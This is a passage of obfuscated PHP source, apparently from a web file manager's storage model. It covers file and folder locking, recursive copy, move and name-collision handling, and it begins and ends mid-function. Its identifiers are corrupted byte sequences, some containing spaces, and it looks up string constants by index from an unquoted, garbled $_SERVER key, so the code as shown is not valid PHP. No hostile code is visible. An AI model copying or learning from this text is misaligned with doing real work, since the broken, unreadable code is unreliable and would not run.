FÑº…ÌÑ”ß: CacheLock::setErrorMsg($dŠ†ËâÍÌŠ[160] . htmlspecialchars($aÚá ¦ÔÆ[$dŠ†ËâÍÌŠ[28]]) . $dŠ†ËâÍÌŠ[530] . $C‘·ÜèìÒ¨); $this->_lockKey($fíÂ´¥Ç‰Ø, 1); $this->_lockKey($fíÂ´¥Ç‰Ø, 0); goto EÛÉ©ƒèÙ¨; E‡¯ÀÜ…š™: $dŠ†ËâÍÌŠ =& $_SERVER[›é¼±]; $aÚá ¦ÔÆ = $this->sourceInfo($a»Ï¤ê¿¯§); $fíÂ´¥Ç‰Ø = $EÇœ‹ÂŠ° . $dŠ†ËâÍÌŠ[95] . $a»Ï¤ê¿¯§; goto f¹ğ¤‡æà; fßñí¸­†Æ: } private function _lockCheckEnd($fºäÆÒ÷±Ï, $CÜ§ïÊ…‰Ó) { goto Fê–™öİÓ²; dî–Ã¦¡Ô: if ($DÍÀÂ‚ô» > 0.5) { unset(self::$cacheSourceInfo[$DášõÑàåÏ[452] . $CÜ§ïÊ…‰Ó]); } $Dª°æ„ƒùÕ = $this->sourceInfo($CÜ§ïÊ…‰Ó); if (!$Dª°æ„ƒùÕ) { show_json(LNG($DášõÑàåÏ[105]), !1); } goto Aå—Æµ; Fê–™öİÓ²: $DášõÑàåÏ =& $_SERVER[›é¼±]; $cÂï‰éä‘Ÿ = $fºäÆÒ÷±Ï . $DášõÑàåÏ[95] . $CÜ§ïÊ…‰Ó; CacheLock::setErrorMsg($DášõÑàåÏ[376]); goto b½¤Ëç¦Š²; b½¤Ëç¦Š²: if (!isset($this->_lockTimeStart[$cÂï‰éä‘Ÿ])) { return; } $DÍÀÂ‚ô» = timeFloat() - $this->_lockTimeStart[$cÂï‰éä‘Ÿ]; unset($this->_lockTimeStart[$cÂï‰éä‘Ÿ]); goto dî–Ã¦¡Ô; Aå—Æµ: } private function _lockParent($b…ø·±ŸªÎ, $CÂšÒ‹Ôğ˜, $c¾¦‹ä‚×) { if (!$this->autoLockSet) { return; } $D¾ßÚ½Ïçø = $this->sourceInfo($b…ø·±ŸªÎ); if (!is_array($D¾ßÚ½Ïçø)) { return; } $còÇåÙ»³ = array_reverse($this->parentLevelArray($D¾ßÚ½Ïçø[$_SERVER[›é¼±][515]])); foreach ($còÇåÙ»³ as $cÖˆ³—³¶) { $this->_lockEvent($cÖˆ³—³¶, $CÂšÒ‹Ôğ˜, $c¾¦‹ä‚×); } } private function _lockEvent($c—„òé‚Ãá, $DÌ¯œ’¢É×, $A½¦ª¹Ó») { $Bô×¥ÓÇ•³ =& $_SERVER[›é¼±]; if (!$this->autoLockSet) { return; } foreach ($DÌ¯œ’¢É× as $d©Ç´ä×¬ ) { $B­¥‰Õ‹¹ = $d©Ç´ä×¬  . $Bô×¥ÓÇ•³[95] . $c—„òé‚Ãá; if ($A½¦ª¹Ó» && CacheLock::lockGet($Bô×¥ÓÇ•³[553] . $B­¥‰Õ‹¹)) { continue; } $this->_lockKey($B­¥‰Õ‹¹, $A½¦ª¹Ó»); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($eÎ•³…ô¥µ, $eê³‘Ñ‚ßæ = 1) { $AÖ±†•†‹Ñ = $_SERVER[›é¼±][553] . md5($eÎ•³…ô¥µ); if ($eê³‘Ñ‚ßæ) { if (isset(self::$_lockItemArr[$AÖ±†•†‹Ñ])) { return; } self::$_lockItemArr[$AÖ±†•†‹Ñ] = 1; CacheLock::lock($AÖ±†•†‹Ñ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$AÖ±†•†‹Ñ])) { return; } unset(self::$_lockItemArr[$AÖ±†•†‹Ñ]); CacheLock::unlock($AÖ±†•†‹Ñ); } } public function isParentOf($fâµ“¦«‡£, $F†ô±‹£ò¯) { goto DÎÈ¼ÚáË®; eª÷«‘İ¸¬: $aæ¦á£ÇóÍ = $AÓĞëŒ¬ÅÙ[$CÂŞì¦¢ù²[515]] . $AÓĞëŒ¬ÅÙ[$CÂŞì¦¢ù²[397]] . $CÂŞì¦¢ù²[47]; $e ÆåÏŸÀ‘ = $f¦»ÙÜ”‡Ô[$CÂŞì¦¢ù²[515]] . $f¦»ÙÜ”‡Ô[$CÂŞì¦¢ù²[397]] . $CÂŞì¦¢ù²[47]; $b¥ ¨ ©ß = strpos($e ÆåÏŸÀ‘, $aæ¦á£ÇóÍ) === 0; goto d•‰ãš„Æ; d•‰ãš„Æ: return $b¥ ¨ ©ß; goto C½Í°ƒ½; DÎÈ¼ÚáË®: $CÂŞì¦¢ù² =& $_SERVER[›é¼±]; $AÓĞëŒ¬ÅÙ = $this->sourceInfo($fâµ“¦«‡£); $f¦»ÙÜ”‡Ô = $this->sourceInfo($F†ô±‹£ò¯); goto eª÷«‘İ¸¬; C½Í°ƒ½: } private $targetIsDelete = 0; public function copy($A·ã„ÍÜ—, $B¨ôÑÔ§»¥, $CÉèŒäğç = REPEAT_REPLACE, $fáŸôïòĞ± = '') { goto eÊ©­âøÒ; cÄŠº¦¾Ó: $this->_childrenListClear(); $this->lockCopyEnd($A·ã„ÍÜ—); $this->lockWriteEnd($B¨ôÑÔ§»¥, $dÛ÷ˆ‹ÙÌ§); goto C©½À’Üƒƒ; e„Ë Çêƒ: $this->lockCopyStart($A·ã„ÍÜ—); $this->lockWriteStart($B¨ôÑÔ§»¥, $dÛ÷ˆ‹ÙÌ§); $B»ö‚´ÚĞ = array($fØ©‚°Õ[554] => array(), $fØ©‚°Õ[555] => array(), $fØ©‚°Õ[556] => array()); goto d“•‚ƒ‘àó; d“•‚ƒ‘àó: $this->targetIsDelete = intval($cà™¸Æ¾Èæ[$fØ©‚°Õ[425]]); $E•ù¯‡†Úß = $this->fileNameExistCache($B¨ôÑÔ§»¥, $cà™¸Æ¾Èæ[$fØ©‚°Õ[28]]); $c¤§ƒé«ÄĞ = $this->_copy($A·ã„ÍÜ—, $B¨ôÑÔ§»¥, $CÉèŒäğç, $B»ö‚´ÚĞ, !0, $fáŸôïòĞ±); goto cÄŠº¦¾Ó; eÊ©­âøÒ: $fØ©‚°Õ =& $_SERVER[›é¼±]; $cà™¸Æ¾Èæ = $this->sourceInfo($A·ã„ÍÜ—); $E»öÏ°ŞˆÁ = $this->sourceInfo($B¨ôÑÔ§»¥); goto eÈå‡çì°”; C©½À’Üƒƒ: if ($cà™¸Æ¾Èæ[$fØ©‚°Õ[405]] == $fØ©‚°Õ[87] && $E•ù¯‡†Úß == $c¤§ƒé«ÄĞ) { $this->folderSizeResetChildren($E•ù¯‡†Úß); } Model($fØ©‚°Õ[557])->addAll($B»ö‚´ÚĞ[$fØ©‚°Õ[555]], array(), !0); if ($E•ù¯‡†Úß != $c¤§ƒé«ÄĞ || $cà™¸Æ¾Èæ[$fØ©‚°Õ[405]] == $fØ©‚°Õ[87]) { Model($fØ©‚°Õ[558])->eventCopy($c¤§ƒé«ÄĞ); } goto f–•õÆŒ„µ; eÈå‡çì°”: if (!$cà™¸Æ¾Èæ || !$E»öÏ°ŞˆÁ || $E»öÏ°ŞˆÁ[$fØ©‚°Õ[405]] != $fØ©‚°Õ[87]) { return !1; } if ($this->isParentOf($A·ã„ÍÜ—, $B¨ôÑÔ§»¥)) { return !1; } $dÛ÷ˆ‹ÙÌ§ = $fáŸôïòĞ± ? $fáŸôïòĞ± : $cà™¸Æ¾Èæ[$fØ©‚°Õ[28]]; goto e„Ë Çêƒ; bÆ‹“âŸ†Û: $this->updateModifyTime($B¨ôÑÔ§»¥); return $c¤§ƒé«ÄĞ; goto AéÍİµôŠï; f–•õÆŒ„µ: $this->saveAll($B»ö‚´ÚĞ[$fØ©‚°Õ[556]]); Model($fØ©‚°Õ[193])->linkAdd($B»ö‚´ÚĞ[$fØ©‚°Õ[554]]); $this->folderSizeReset($B¨ôÑÔ§»¥); goto bÆ‹“âŸ†Û; AéÍİµôŠï: } private function _copy($d¿äçö‘“, $eõàÁÍË³, $C¯÷Ë´¤Ü, &$E‘Ø°§‡‰ğ, $C Ğ¯ÉòÅ‘, $Dº…®ö°Â = '') { goto Aï˜æ•®À©; E‚Ÿ–¡¢§¼: return $AÒÄö©’ÜÛ; goto BƒÊ‡°à‹; AğÍ„¶ÃÊÂ: $BŞÆˆïÍŒ = $Dº…®ö°Â ? $Dº…®ö°Â : $E‰çÅªµàË[$B™¤¢è™Œ¨[28]]; $AÛÀ°”³Ğ¬ = $this->fileNameExistCache($eõàÁÍË³, $BŞÆˆïÍŒ); if ($C Ğ¯ÉòÅ‘) { $this->_childrenAllMake($d¿äçö‘“); if ($AÕ¯ÖÖ†‹’ && $AÛÀ°”³Ğ¬) { $this->_childrenAllMake($AÛÀ°”³Ğ¬); } } goto FïÄáµÛ•ã; Aï˜æ•®À©: $B™¤¢è™Œ¨ =& $_SERVER[›é¼±]; $E‰çÅªµàË = $this->sourceInfoCache($d¿äçö‘“); $AÕ¯ÖÖ†‹’ = $E‰çÅªµàË[$B™¤¢è™Œ¨[405]] == $B™¤¢è™Œ¨[87]; goto AğÍ„¶ÃÊÂ; FïÄáµÛ•ã: if (!$AÛÀ°”³Ğ¬) { return $this->_copyCreate($d¿äçö‘“, $eõàÁÍË³, $BŞÆˆïÍŒ, $E‘Ø°§‡‰ğ); } $AÒÄö©’ÜÛ = $AÛÀ°”³Ğ¬; if ($AÕ¯ÖÖ†‹’) { if ($C¯÷Ë´¤Ü == REPEAT_RENAME_FOLDER) { $BŞÆˆïÍŒ = $this->fileNameAutoCache($eõàÁÍË³, $BŞÆˆïÍŒ, $C¯÷Ë´¤Ü, $AÕ¯ÖÖ†‹’); $AÒÄö©’ÜÛ = $this->_copyCreate($d¿äçö‘“, $eõàÁÍË³, $BŞÆˆïÍŒ, $E‘Ø°§‡‰ğ); } else { $eŞ‹ÓÊÏëÚ = $this->_childrenList($d¿äçö‘“); foreach ($eŞ‹ÓÊÏëÚ as $e…ŞÎÂ¾­) { $this->_copy($e…ŞÎÂ¾­[$B™¤¢è™Œ¨[397]], $AÛÀ°”³Ğ¬, $C¯÷Ë´¤Ü, $E‘Ø°§‡‰ğ, !1); } } } else { if ($C¯÷Ë´¤Ü == REPEAT_RENAME || $C¯÷Ë´¤Ü == REPEAT_RENAME_FOLDER) { $BŞÆˆïÍŒ = $this->fileNameAutoCache($eõàÁÍË³, $BŞÆˆïÍŒ, $C¯÷Ë´¤Ü, $AÕ¯ÖÖ†‹’); $AÒÄö©’ÜÛ = $this->_copyCreate($d¿äçö‘“, $eõàÁÍË³, $BŞÆˆïÍŒ, $E‘Ø°§‡‰ğ); } else { if ($C¯÷Ë´¤Ü == REPEAT_REPLACE) { $DÖ–×À–Ş… = $this->sourceInfoCache($AÛÀ°”³Ğ¬); $Aˆ¾·ÜõÆ = $this->fileHistory($DÖ–×À–Ş…, $E‰çÅªµàË[$B™¤¢è™Œ¨[461]], $E‰çÅªµàË[$B™¤¢è™Œ¨[78]]); if ($Aˆ¾·ÜõÆ) { $E‘Ø°§‡‰ğ[$B™¤¢è™Œ¨[554]][] = $E‰çÅªµàË[$B™¤¢è™Œ¨[461]]; } } else { if ($C¯÷Ë´¤Ü == REPEAT_SKIP) { } } } Hook::trigger($B™¤¢è™Œ¨[559], array($B™¤¢è™Œ¨[560], $E‰çÅªµàË, 0)); } goto E‚Ÿ–¡¢§¼; BƒÊ‡°à‹: } private function _copyCreate($c³ó²¼„ó, $Aà© Ûó‡Ş, $dˆ£ùˆÖÏ , &$Eï˜Ú£êè¤) { goto f±óöëËé¾; f†ºíƒ¸Ù: $dø³É†…‚º = $this->sourceInfo($EÑ»ãÄÆ—³); foreach ($E‡ƒëÛğ¯ as $Cª‘Œˆª½) { $D©•ˆÏÀÉé = $this->_makeItemData($Cª‘Œˆª½, $dø³É†…‚º, $Cª‘Œˆª½[$FíÚøâ„¦[28]]); $D©•ˆÏÀÉé[$FíÚøâ„¦[515]] = $Cª‘Œˆª½[$FíÚøâ„¦[515]]; $BÁñİÚô¨[] = $D©•ˆÏÀÉé; } $this->chunkEventSet($FíÚøâ„¦[564], array($FíÚøâ„¦[565], $C¦·ÙØÄÄ¡, $Føõ‡°ò®À)); goto c‰×±…„Ç²; c‰×±…„Ç²: $this->addAll($BÁñİÚô¨, array(), !1); $cåƒ­†“ìè = $this->where(array($FíÚøâ„¦[492] => $EÑ»ãÄÆ—³))->select(); $f¯õ†²øÅÉ = $this->_childrenMakeRelation($E‡ƒëÛğ¯, $cåƒ­†“ìè); goto B¤±à§À§Œ; a‘´ñÓÀà·: foreach ($cåƒ­†“ìè as $Cª‘Œˆª½) { $bº—ÔÑŒ² = $Cª‘Œˆª½[$FíÚøâ„¦[397]]; $fÎ¹¦î§ÈÚ = $this->_childrenMatch($f¯õ†²øÅÉ, $Cª‘Œˆª½, $dø³É†…‚º); $bÈø©ñæ[] = array($FíÚøâ„¦[397], $bº—ÔÑŒ², $FíÚøâ„¦[492], $fÎ¹¦î§ÈÚ[$FíÚøâ„¦[492]]); $CÄˆ—àÍŠ®[] = array($FíÚøâ„¦[397], $bº—ÔÑŒ², $FíÚøâ„¦[515], $fÎ¹¦î§ÈÚ[$FíÚøâ„¦[515]]); $this->_copyApplyMeta($Cª‘Œˆª½, $Eï˜Ú£êè¤); if ($Cª‘Œˆª½[$FíÚøâ„¦[405]] != $FíÚøâ„¦[87]) { $Eï˜Ú£êè¤[$FíÚøâ„¦[554]][] = $Cª‘Œˆª½[$FíÚøâ„¦[461]]; } } $this->chunkEventSet($FíÚøâ„¦[566], array($FíÚøâ„¦[567], $C¦·ÙØÄÄ¡, $Føõ‡°ò®À)); $this->saveAll($bÈø©ñæ); goto BãºÆ¹Äø; eÚÆâ‰¼ñ«: $EÑ»ãÄÆ—³ = $this->add($C¦·ÙØÄÄ¡); $F•àŸŞ‰š® = array($FíÚøâ„¦[397] => $EÑ»ãÄÆ—³, $FíÚøâ„¦[28] => $dˆ£ùˆÖÏ ); $this->_copyApplyMeta($F•àŸŞ‰š®, $Eï˜Ú£êè¤); goto FÃá«ÆÏ³—; e´¦õÏë: $C¦·ÙØÄÄ¡ = $this->_makeItemData($CœùïÇ¹Á, $B¿ÅÌø¢„„, $dˆ£ùˆÖÏ ); Hook::trigger($FíÚøâ„¦[561], $C¦·ÙØÄÄ¡); Hook::trigger($FíÚøâ„¦[562], array($FíÚøâ„¦[563], $C¦·ÙØÄÄ¡, 0)); goto eÚÆâ‰¼ñ«; BãºÆ¹Äø: $this->chunkEventSet($FíÚøâ„¦[568], array($FíÚøâ„¦[569], $C¦·ÙØÄÄ¡, $Føõ‡°ò®À)); $this->saveAll($CÄˆ—àÍŠ®); return $EÑ»ãÄÆ—³; goto DÈ˜ôí£–; B¤±à§À§Œ: $f¯õ†²øÅÉ[$c³ó²¼„ó] = $EÑ»ãÄÆ—³; $bÈø©ñæ = array(); $CÄˆ—àÍŠ® = array(); goto a‘´ñÓÀà·; dÜƒŒŠ¢æ: $this->_childrenListAll($c³ó²¼„ó, $E‡ƒëÛğ¯); $Føõ‡°ò®À = count($E‡ƒëÛğ¯); if ($Føõ‡°ò®À == 0) { return $EÑ»ãÄÆ—³; } goto f†ºíƒ¸Ù; FÃá«ÆÏ³—: if ($CœùïÇ¹Á[$FíÚøâ„¦[405]] != $FíÚøâ„¦[87]) { $Eï˜Ú£êè¤[$FíÚøâ„¦[554]][] = $CœùïÇ¹Á[$FíÚøâ„¦[461]]; return $EÑ»ãÄÆ—³; } $E‡ƒëÛğ¯ = array(); $BÁñİÚô¨ = array(); goto dÜƒŒŠ¢æ; f±óöëËé¾: $FíÚøâ„¦ =& $_SERVER[›é¼±]; $CœùïÇ¹Á = $this->sourceInfoCache($c³ó²¼„ó); $B¿ÅÌø¢„„ = $this->sourceInfoCache($Aà© Ûó‡Ş); goto e´¦õÏë; DÈ˜ôí£–: } private function _childrenMakeRelation($bÑ¤·ß³Í¸, $A­ƒèÕß“§) { $fÉ—ÖéØ½­ =& $_SERVER[›é¼±]; $Fé¥À¢§ = array(); $bËÄœÃ†’± = array(); foreach ($bÑ¤·ß³Í¸ as $F› Û†ÇØ) { $c›ÜóòäšÑ = $F› Û†ÇØ[$fÉ—ÖéØ½­[28]] . $fÉ—ÖéØ½­[8] . $F› Û†ÇØ[$fÉ—ÖéØ½­[515]]; $Fé¥À¢§[$c›ÜóòäšÑ] = $F› Û†ÇØ[$fÉ—ÖéØ½­[397]]; } foreach ($A­ƒèÕß“§ as $F› Û†ÇØ) { $c›ÜóòäšÑ = $F› Û†ÇØ[$fÉ—ÖéØ½­[28]] . $fÉ—ÖéØ½­[8] . $F› Û†ÇØ[$fÉ—ÖéØ½­[515]]; $Có„”Æµˆ· = $Fé¥À¢§[$c›ÜóòäšÑ]; $bËÄœÃ†’±[$Có„”Æµˆ·] = $F› Û†ÇØ[$fÉ—ÖéØ½­[397]]; } return $bËÄœÃ†’±; } private function _childrenMatch($bôùªã³©, $bª¨ÒØÙ¯î, $F•Š»£¡óñ) { goto eÎàô¶…ôÊ; eÎàô¶…ôÊ: $dè§ó›£ÒÊ =& $_SERVER[›é¼±]; $D¶Ò„çÍĞì = $F•Š»£¡óñ[$dè§ó›£ÒÊ[515]]; $FŸñçÚÛ = $this->parentLevelArray($bª¨ÒØÙ¯î[$dè§ó›£ÒÊ[515]]); goto d‡„Ó­ŠáÊ; Fí¹»Ç ñ¤: $cÇ“¿øØ¤Ä = $EÊå²¸ÖŠ[count($EÊå²¸ÖŠ) - 1]; return array($dè§ó›£ÒÊ[492] => $cÇ“¿øØ¤Ä, $dè§ó›£ÒÊ[515] => $D¶Ò„çÍĞì); goto BÃëŠÓğö; d‡„Ó­ŠáÊ: foreach ($FŸñçÚÛ as $E¨ƒ¬‰›¾Ù) { if (isset($bôùªã³©[$E¨ƒ¬‰›¾Ù])) { $D¶Ò„çÍĞì .= $bôùªã³©[$E¨ƒ¬‰›¾Ù] . $dè§ó›£ÒÊ[570]; } } $D¶Ò„çÍĞì = rtrim($D¶Ò„çÍĞì, $dè§ó›£ÒÊ[47]) . $dè§ó›£ÒÊ[47]; $EÊå²¸ÖŠ = $this->parentLevelArray($D¶Ò„çÍĞì); goto Fí¹»Ç ñ¤; BÃëŠÓğö: } private function _makeItemData($cÀ†º­»ê…, $E„ğËÓÃ•, $AŠÚÇ¿ó˜) { $A†®é‘›ƒ´ =& $_SERVER[›é¼±]; $b®ö¨†»´ = array($A†®é‘›ƒ´[571] => $cÀ†º­»ê…[$A†®é‘›ƒ´[405]], $A†®é‘›ƒ´[415] => $AŠÚÇ¿ó˜, $A†®é‘›ƒ´[572] => $cÀ†º­»ê…[$A†®é‘›ƒ´[407]] ? $cÀ†º­»ê…[$A†®é‘›ƒ´[407]] : $A†®é‘›ƒ´[33], $A†®é‘›ƒ´[462] => $cÀ†º­»ê…[$A†®é‘›ƒ´[461]] ? $cÀ†º­»ê…[$A†®é‘›ƒ´[461]] : 0, $A†®é‘›ƒ´[573] => $cÀ†º­»ê…[$A†®é‘›ƒ´[78]] ? $cÀ†º­»ê…[$A†®é‘›ƒ´[78]] : 0, $A†®é‘›ƒ´[574] => intval($E„ğËÓÃ•[$A†®é‘›ƒ´[406]]), $A†®é‘›ƒ´[575] => intval($E„ğËÓÃ•[$A†®é‘›ƒ´[498]]), $A†®é‘›ƒ´[576] => intval(USER_ID), $A†®é‘›ƒ´[577] => intval(USER_ID), $A†®é‘›ƒ´[396] => intval($E„ğËÓÃ•[$A†®é‘›ƒ´[397]]), $A†®é‘›ƒ´[578] => $E„ğËÓÃ•[$A†®é‘›ƒ´[515]] . $E„ğËÓÃ•[$A†®é‘›ƒ´[397]] . $A†®é‘›ƒ´[47], $A†®é‘›ƒ´[419] => $cÀ†º­»ê…[$A†®é‘›ƒ´[84]] ? $cÀ†º­»ê…[$A†®é‘›ƒ´[84]] : time(), $A†®é‘›ƒ´[424] => 0, $A†®é‘›ƒ´[579] => $A†®é‘›ƒ´[33]); return $b®ö¨†»´; } private function _copyApplyMeta($d›Ö‚šÄ¯™, &$d‘ğñŸñ„ğ) { $BÏâ¼ßïí© =& $_SERVER[›é¼±]; $bÌ…äì = $d›Ö‚šÄ¯™[$BÏâ¼ßïí©[397]]; $Cİ‡Ì¥‚ñ = $d›Ö‚šÄ¯™[$BÏâ¼ßïí©[28]]; if (!isset($d›Ö‚šÄ¯™[$BÏâ¼ßïí©[580]]) || !$d›Ö‚šÄ¯™[$BÏâ¼ßïí©[580]] || $d›Ö‚šÄ¯™[$BÏâ¼ßïí©[580]] == $BÏâ¼ßïí©[191]) { $d‘ğñŸñ„ğ[$BÏâ¼ßïí©[556]][] = array($BÏâ¼ßïí©[397], $bÌ…äì, $BÏâ¼ßïí©[580], short_id($bÌ…äì)); } if (Input::check($Cİ‡Ì¥‚ñ, $BÏâ¼ßïí©[581])) { $d‘ğñŸñ„ğ[$BÏâ¼ßïí©[555]][] = array($BÏâ¼ßïí©[397] => $bÌ…äì, $BÏâ¼ßïí©[93] => $BÏâ¼ßïí©[458], $BÏâ¼ßïí©[372] => str_replace($BÏâ¼ßïí©[50], $BÏâ¼ßïí©[33], Pinyin::get($Cİ‡Ì¥‚ñ))); $d‘ğñŸñ„ğ[$BÏâ¼ßïí©[555]][] = array($BÏâ¼ßïí©[397] => $bÌ…äì, $BÏâ¼ßïí©[93] => $BÏâ¼ßïí©[457], $BÏâ¼ßïí©[372] => Pinyin::get($Cİ‡Ì¥‚ñ, $BÏâ¼ßïí©[582])); } $d‘ğñŸñ„ğ[$BÏâ¼ßïí©[555]][] = array($BÏâ¼ßïí©[397] => $bÌ…äì, $BÏâ¼ßïí©[93] => $BÏâ¼ßïí©[436], $BÏâ¼ßïí©[372] => KodSort::makeStr($Cİ‡Ì¥‚ñ)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($d‘°…¹Û Â) { goto A‚ÂŸÓìÒä; c¡ÎçôìùÏ: $bÕ×êÓ†‹Â = array($EÅŞº•óº[515] => array($EÅŞº•óº[538], $Bƒ³éÓÀĞ¬[$EÅŞº•óº[515]] . $d‘°…¹Û Â . $EÅŞº•óº[539]), $EÅŞº•óº[425] => $this->targetIsDelete); $d¾öÙ±„­­ = $this->field($Cİİ¢š†)->where($bÕ×êÓ†‹Â)->select(); if (!$d¾öÙ±„­­) { return; } goto a›õÙ‘ç¤; a›õÙ‘ç¤: $d¾öÙ±„­­ = array_to_keyvalue($d¾öÙ±„­­, $EÅŞº•óº[397]); foreach ($d¾öÙ±„­­ as $bŸî‘ˆ¦Ê²) { $B¬á«ÍÉç = $bŸî‘ˆ¦Ê²[$EÅŞº•óº[492]]; $d‘°…¹Û Â = $bŸî‘ˆ¦Ê²[$EÅŞº•óº[397]]; if (!isset($this->_childrenListCache[$d‘°…¹Û Â]) && $bŸî‘ˆ¦Ê²[$EÅŞº•óº[405]] == $EÅŞº•óº[87]) { $this->_childrenListCache[$d‘°…¹Û Â] = array(); } if (!isset($this->_childrenListCache[$B¬á«ÍÉç])) { $this->_childrenListCache[$B¬á«ÍÉç] = array(); } $this->_childrenListCache[$B¬á«ÍÉç][$d‘°…¹Û Â] = $bŸî‘ˆ¦Ê²; $this->_childrenItemCache[$d‘°…¹Û Â] = $bŸî‘ˆ¦Ê²; } goto aéàâ¡±Œ³; A‚ÂŸÓìÒä: $EÅŞº•óº =& $_SERVER[›é¼±]; $Bƒ³éÓÀĞ¬ = $this->sourceInfo($d‘°…¹Û Â); $Cİİ¢š† = $EÅŞº•óº[583]; goto c¡ÎçôìùÏ; aéàâ¡±Œ³: } private function _childrenListAll($cÕÊŠ®ÌØ×, &$c˜Üé·…Ç) { $F¢‰Š¼‰°´ =& $_SERVER[›é¼±]; if (!isset($this->_childrenListCache[$cÕÊŠ®ÌØ×])) { return; } $Aß‚¦‘‰³ = $this->_childrenListCache[$cÕÊŠ®ÌØ×]; foreach ($Aß‚¦‘‰³ as $då×ä–½± => $bÊÎÌËõÉ) { $c˜Üé·…Ç[$då×ä–½±] = $bÊÎÌËõÉ; if ($bÊÎÌËõÉ[$F¢‰Š¼‰°´[405]] == $F¢‰Š¼‰°´[87]) { $this->_childrenListAll($då×ä–½±, $c˜Üé·…Ç); } } } private function sourceInfoCache($fš“İ±åÛ×) { if (isset($this->_childrenItemCache[$fš“İ±åÛ×])) { return $this->_childrenItemCache[$fš“İ±åÛ×]; } return $this->sourceInfo($fš“İ±åÛ×); } private function _childrenList($C×‡­×÷£) { if (isset($this->_childrenListCache[$C×‡­×÷£])) { return $this->_childrenListCache[$C×‡­×÷£]; } return $this->_childrenListSelect($C×‡­×÷£); } private function _childrenListSelect($f†ÃšÄ‹½œ) { goto d‰ù¶¾å„Ö; aéÁÄ¸ÊÇ: $A°°ƒ‘Ï = $A°°ƒ‘Ï ? $A°°ƒ‘Ï : array(); $bÍŒÕœÜ”Û = array_to_keyvalue($A°°ƒ‘Ï, $DĞî“‚º”ª[397]); $this->_childrenListCache[$f†ÃšÄ‹½œ] = $bÍŒÕœÜ”Û; goto B™ƒ”ÁŒ»; B™ƒ”ÁŒ»: foreach ($bÍŒÕœÜ”Û as $f†ÃšÄ‹½œ => $f…ÓËêÒ¦é) { $this->_childrenItemCache[$f†ÃšÄ‹½œ] = $f…ÓËêÒ¦é; } return $bÍŒÕœÜ”Û; goto F½êğ­ î; d‰ù¶¾å„Ö: $DĞî“‚º”ª =& $_SERVER[›é¼±]; $C¡’³É‡ = array($DĞî“‚º”ª[492] => $f†ÃšÄ‹½œ, $DĞî“‚º”ª[425] => $this->targetIsDelete); $A°°ƒ‘Ï = $this->where($C¡’³É‡)->select(); goto aéÁÄ¸ÊÇ; F½êğ­ î: } private function fileNameExistCache($dŠÒœåá×½, $e³àÅ¿İÜ‡) { $a…šŒãà¥ =& $_SERVER[›é¼±]; $e³àÅ¿İÜ‡ = strtolower($e³àÅ¿İÜ‡); $EİÍ“£Ü±­ = $this->_childrenList($dŠÒœåá×½); foreach ($EİÍ“£Ü±­ as $Fô­¡„ÇÆ§) { if ($e³àÅ¿İÜ‡ == strtolower($Fô­¡„ÇÆ§[$a…šŒãà¥[28]])) { return $Fô­¡„ÇÆ§[$a…šŒãà¥[397]]; } } return !1; } private function fileNameAutoCache($DÜóôÓ, $FëÎ¤ƒ—²ä, $dê…àØÄ½”, $Aïˆ ºÜÕ„) { $AÜÇÙ‚õÒ‹ =& $_SERVER[›é¼±]; $FÔ¼Î Ôìç = $this->_childrenList($DÜóôÓ); $fà®ÉŞ÷ùõ = array_to_keyvalue($FÔ¼Î Ôìç, $AÜÇÙ‚õÒ‹[33], $AÜÇÙ‚õÒ‹[28]); return $this->fileNameAutoGet($fà®ÉŞ÷ùõ, $FëÎ¤ƒ—²ä, $dê…àØÄ½”, $Aïˆ ºÜÕ„); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($a¡°íğ£İ•, $FİÔ¸ß‚¾ˆ, $cëŞ»•«À = REPEAT_REPLACE, $d¥›Ö…Î‰º = '') { goto E£òÄ‡–ò; dÄ‚ÖªéæŒ: if ($B¿Š‘‡à”ƒ[$eöÖ…Ş¿Ğ[492]] == $e«Î¬ìÉÔ[$eöÖ…Ş¿Ğ[397]]) { if ($B¿Š‘‡à”ƒ[$eöÖ…Ş¿Ğ[425]] == $eöÖ…Ş¿Ğ[87]) { Model($eöÖ…Ş¿Ğ[423])->restore(array($a¡°íğ£İ•)); } if (!$d¥›Ö…Î‰º || $d¥›Ö…Î‰º == $B¿Š‘‡à”ƒ[$eöÖ…Ş¿Ğ[28]]) { return $a¡°íğ£İ•; } } $eƒœÄ¼–Œ³ = $this->pathInfoMore($a¡°íğ£İ•); if ($this->isParentOf($a¡°íğ£İ•, $FİÔ¸ß‚¾ˆ)) { return !1; } goto Eô¢¶¹¹…; DŒ¤¦êµºç: $this->lockWriteStart($FİÔ¸ß‚¾ˆ, $fôŞã´ÕÈË); $bùå»ÌöÊ = array($eöÖ…Ş¿Ğ[554] => array(), $eöÖ…Ş¿Ğ[586] => !1); $this->clearShare($a¡°íğ£İ•, $FİÔ¸ß‚¾ˆ); goto FŸó°‚”Ò¡; E£òÄ‡–ò: $eöÖ…Ş¿Ğ =& $_SERVER[›é¼±]; $B¿Š‘‡à”ƒ = $this->sourceInfo($a¡°íğ£İ•); $e«Î¬ìÉÔ = $this->sourceInfo($FİÔ¸ß‚¾ˆ); goto dÄ‚ÖªéæŒ; aì—®ø¬Àö: if ($B¿Š‘‡à”ƒ[$eöÖ…Ş¿Ğ[492]] == $FİÔ¸ß‚¾ˆ && $d¥›Ö…Î‰º != $B¿Š‘‡à”ƒ[$eöÖ…Ş¿Ğ[28]]) { $D§ß…È¿Ş‚ = $this->fileNameExist($FİÔ¸ß‚¾ˆ, $d¥›Ö…Î‰º); if ($D§ß…È¿Ş‚ && $B¿Š‘‡à”ƒ[$eöÖ…Ş¿Ğ[405]] == $eöÖ…Ş¿Ğ[191]) { goto A‰â„­İê„; A‰â„­İê„: $Bèğ…Ùè»ß = $this->sourceInfo($D§ß…È¿Ş‚); $bÓö‹Ì¸â† = $this->fileHistory($Bèğ…Ùè»ß, $B¿Š‘‡à”ƒ[$eöÖ…Ş¿Ğ[461]], $B¿Š‘‡à”ƒ[$eöÖ…Ş¿Ğ[78]]); if (!$bÓö‹Ì¸â†) { Model($eöÖ…Ş¿Ğ[464])->remove($B¿Š‘‡à”ƒ[$eöÖ…Ş¿Ğ[461]]); } goto BÊó¹ÉÔ¢Æ; CŒ‹äºÛ: return $D§ß…È¿Ş‚; goto cóÓ›ï‰Á»; BÊó¹ÉÔ¢Æ: $this->removeNow($a¡°íğ£İ•, !1); 